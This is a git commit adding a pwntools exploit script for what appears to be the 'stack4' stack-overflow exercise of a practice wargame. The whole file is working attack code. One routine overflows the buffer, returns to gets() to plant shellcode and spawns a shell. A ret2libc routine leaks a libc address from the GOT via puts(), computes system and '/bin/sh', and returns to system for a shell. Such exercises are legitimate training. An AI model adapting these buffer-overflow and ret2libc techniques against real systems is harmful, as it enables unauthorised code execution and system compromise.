c5aeb0d853300cbe7ba4f4bf75330c64be7b4656
dotiendat97 <38005847+dotiendat97@users.noreply.github.com>
2018-07-23 15:46:56 +0700

    Create stack4.py

---
+++ stack4.py
@@ -0,0 +1,60 @@
+from pwn import *
+r = process("stack4")
+raw_input("debug?")
+
+def shell():
+	shellcode = asm(shellcraft.sh())
+	gets_plt = 0x804830c
+	shell_addr = 0x8049000
+	payload = "a"*(0x58 - 0x10 + 4)
+	payload += p32(gets_plt) #ret add 1
+	payload += p32(shell_addr) #ret add 2
+	payload += p32(shell_addr) # arg
+	
+	r.sendline(payload)
+	r.sendline(shellcode)
+	
+	r.interactive()
+
+
+def ret2libc():
+	puts_plt = 0x804832c
+	gets_got = 0x80495fc
+	
+	main = 0x08048408 
+	win = 0x080483F4
+	offset_gets = 0x05f3e0
+	offset_system = 0x03ada0
+	offset_sh = 0x0000E5F2 + 5
+	payload = "a"*(0x58 + 4 - 0x10)
+	payload += p32(win)
+	
+	payload += p32(puts_plt) #ret add 1
+	payload += p32(main) #ret add 2
+	payload	+= p32(gets_got) #arg
+	r.sendline(payload)
+	r.recvuntil("code flow successfully changed\n")
+	
+	res = r.recv(4)
+	gets = u32(res)
+
+	libc = gets - offset_gets
+	system = libc + offset_system
+	sh = libc + offset_sh
+
+	log.info("gets: %#x" % gets)
+	log.info("libc: %#x" % libc)
+	log.info("system: %#x" % system)
+	log.info("sh: %#x" % sh)
+
+	payload = "a"*(0x50 + 4 -0x10)
+	payload += p32(win)
+	payload += p32(system) #ret add 1
+	payload += p32(main) #ret add 2
+	payload	+= p32(sh) #arg
+	r.sendline(payload)
+
+	r.interactive()
+
+#shell()
+ret2libc()
